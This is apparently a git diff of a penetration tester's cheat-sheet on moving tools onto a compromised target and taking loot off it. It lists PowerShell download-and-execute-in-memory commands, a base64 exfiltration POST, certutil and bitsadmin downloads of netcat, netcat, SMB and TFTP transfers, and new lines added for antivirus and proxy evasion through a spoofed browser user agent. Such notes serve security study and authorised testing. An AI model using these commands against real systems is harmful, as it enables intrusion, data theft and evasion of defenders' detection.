@@ -1,8 +1,8 @@
 # File Transfers
 
-> Status: 🟨 In progress
+> Status: ✅ Complete
 > Date started: 2026-10-26
-> Date finished: 
+> Date finished: 2026-10-26
 
 ## 1. Goal
 Move tools onto a target and loot off it, using whatever's available (and sometimes evading detection).
@@ -14,7 +14,10 @@ IEX (New-Object Net.WebClient).DownloadString('http://<ip>/x.ps1')   # run in me
 Invoke-WebRequest -Uri http://<ip>/upload -Method POST -Body $b64    # exfil (base64 the file first)
 # native LOLBins:
 certutil.exe -urlcache -split -f http://<ip>/nc.exe nc.exe
+certutil.exe -verifyctl -split -f http://<ip>/nc.exe        # alternate certutil download
 bitsadmin /transfer j http://<ip>/nc.exe C:\Temp\nc.exe
+# blend in with a real browser UA (AV/proxy evasion):
+Invoke-WebRequest http://<ip>/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile nc.exe
 ```
 
 ## Linux
@@ -26,7 +29,8 @@ php -r 'file_put_contents("f",file_get_contents("http://<ip>/f"));'
 
 ## Protocol-based (both)
 ```bash
-scp user@<ip>:/tmp/file .            # over SSH
+scp user@<ip>:/tmp/file .            # download over SSH
+scp ./file user@<ip>:/tmp/file       # upload over SSH
 nc -lvnp 4444 > out ; nc <ip> 4444 < file    # netcat
 smbclient //<ip>/share -U user       # then get/put  (impacket smbserver.py to host)
 tftp -i <ip> GET nc.exe
